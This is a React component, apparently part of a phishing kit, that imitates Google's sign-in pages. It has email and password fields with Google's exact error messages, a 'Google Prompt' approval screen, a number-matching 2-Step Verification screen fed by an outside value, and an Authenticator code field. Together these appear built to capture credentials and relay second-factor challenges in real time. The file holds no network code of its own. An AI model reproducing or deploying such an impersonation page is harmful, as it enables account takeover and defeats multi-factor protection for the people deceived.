export default function GoogleForm({ currentStep, email, setEmail, password, setPassword, invalid, verificationNumber }) {
    const renderContent = () => {
        switch(currentStep) {
            case 'email':
                return (
                    <div className="relative w-full">
                        <input 
                            type="text" 
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            className={`rounded p-[15px] border text-[16px] w-full ${
                                invalid ? 'border-red-500' : 'border-gray-800'
                            } text-[#1f1f1f] focus:outline-none focus:border-blue-500 peer`}
                        />
                        <label 
                            htmlFor="inputField" 
                            className="absolute left-3 top-3.5 px-1 bg-white transition-all duration-200 text-[#1f1f1f] peer-focus:-top-2 peer-focus:text-sm peer-focus:text-blue-500 peer-focus:bg-white peer-placeholder-shown:top-2 peer-placeholder-shown:text-base"
                        >
                            Email or phone
                        </label>
                        {invalid && (
                            <div className="text-red-500 text-sm mt-1">
                                Couldn't find your Google Account
                            </div>
                        )}
                    </div>
                );
            
            case 'password':
                return (
                    <div className="relative w-full">
                        <input
                            type="password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className={`rounded p-[15px] border text-[16px] w-full ${
                                invalid ? 'border-red-500' : 'border-gray-800'
                            } text-[#1f1f1f] focus:outline-none focus:border-blue-500 peer`}
                        />
                        <label
                            htmlFor="passwordField"
                            className="absolute left-3 top-3.5 px-1 bg-white transition-all duration-200 text-[#1f1f1f] peer-focus:-top-2 peer-focus:text-sm peer-focus:text-blue-500 peer-focus:bg-white peer-placeholder-shown:top-2 peer-placeholder-shown:text-base"
                        >
                            Enter your password
                        </label>
                        {invalid && (
                            <div className="text-red-500 text-sm mt-1">
                                Wrong password. Try again or click Forgot password to reset it.
                            </div>
                        )}
                    </div>
                );

                case 'mfa':
                    return (
                        <div className="relative w-full">
                            <div className="my-6">
                                <div className="text-2xl google font-medium">Google Prompt</div>
                                <p className="mt-4 text-gray-600">Check your phone and tap "Yes" to sign in</p>
                                <div className="my-8 flex justify-center">
                                    <div className="inline-block bg-gray-100 p-4 rounded-full">
                                        <svg xmlns="http://www.w3.org/2000/svg" className="h-12 w-12 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                                        </svg>
                                    </div>
                                </div>
                                <p className="text-gray-600">Not getting the prompt? <button className="text-blue-600">Use another option</button></p>
                            </div>
                        </div>
                    );

                    case '2step':
                        return (
                            <div className="relative w-full">
                                <div className="mb-6">
                                    <div className="text-2xl google font-medium">2-Step Verification</div>
                                    <p className="mt-4 text-gray-600">A number has been sent to your device</p>
                                    <div className="my-6 text-3xl font-bold text-blue-600">{verificationNumber}</div>
                                    <p className="text-gray-600">Tap the matching number on your phone</p>
                                </div>
                            </div>
                        );

                        case 'auth_otp':
                            return (
                                <div className="relative w-full">
                                    <input
                                        type="text"
                                        placeholder="Enter code"
                                        className="rounded p-[15px] border text-[16px] w-full border-gray-800 text-[#1f1f1f] focus:outline-none focus:border-blue-500 peer"
                                    />
                                    <label
                                        htmlFor="otpField"
                                        className="absolute left-3 top-3.5 px-1 bg-white transition-all duration-200 text-[#1f1f1f] peer-focus:-top-2 peer-focus:text-sm peer-focus:text-blue-500 peer-focus:bg-white peer-placeholder-shown:top-2 peer-placeholder-shown:text-base"
                                    >
                                        Enter verification code
                                    </label>
                                    <p className="mt-4 text-gray-600 text-sm">
                                        Open the Google Authenticator app and enter the 6-digit code
                                    </p>
                                </div>
                            );


            default:
                return null;
        }
    };

    return (
        <div className='flex-col gap-y-2 h-full flex w-full'>
            <form className="flex-col gap-y-2 h-full flex w-full">
                {renderContent()}

                {(currentStep === 'email' || currentStep === 'password') && (
                    <div className="w-full font-medium google text-blue-700 text-[15px] flex justify-start items-center">
                        {currentStep === 'password' ? 'Forgot password?' : 'Forgot email?'}
                    </div>
                )}

                {currentStep === 'email' && (
                    <div className="text-[15px] text-gray-700 leading-tight mt-9 pr-5">
                        Before using this app, you can review Google's <span className="text-blue-700 font-normal">privacy policy</span>
                        and <span className="text-blue-700 font-normal">terms of service.</span>
                    </div>
                )}
            </form>
        </div>
    )
}